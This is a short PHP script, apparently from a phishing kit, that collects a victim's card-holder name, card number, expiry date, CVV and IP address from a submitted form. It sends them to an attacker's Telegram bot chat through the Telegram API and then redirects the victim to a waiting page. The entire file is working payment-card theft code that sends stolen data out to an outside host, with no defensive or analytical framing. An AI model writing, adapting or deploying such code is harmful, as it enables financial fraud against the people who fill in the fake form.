<?php 
include'./config.php';
$ip = getenv("REMOTE_ADDR");
$name = $_POST['name'];
$cc = $_POST['cc'];
$exp = $_POST['exp'];
$cvv = $_POST['cvv'];
if (!empty($name) AND !empty($cc) AND !empty($exp) AND !empty($cvv)) {
	$coronamsg .= "[⚜️] ┏━ [ $ip ] ━┓[⚜️]\n";
	$coronamsg .= "[🔑] Name:$name\n";
	$coronamsg .= "[🔅] Cc:$cc\n";
	$coronamsg .= "[🔅] Exp: $exp\n";
	$coronamsg .= "[⚜️] Cvv:$cvv\n";
	$token = "$coronatoken";
    $data = [
    'text' => $coronamsg,
    'chat_id' => $coronachat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    header("Location: ./wait.php?next=exit.php");
}
else{
	header('Location: ./index.php');
}?>
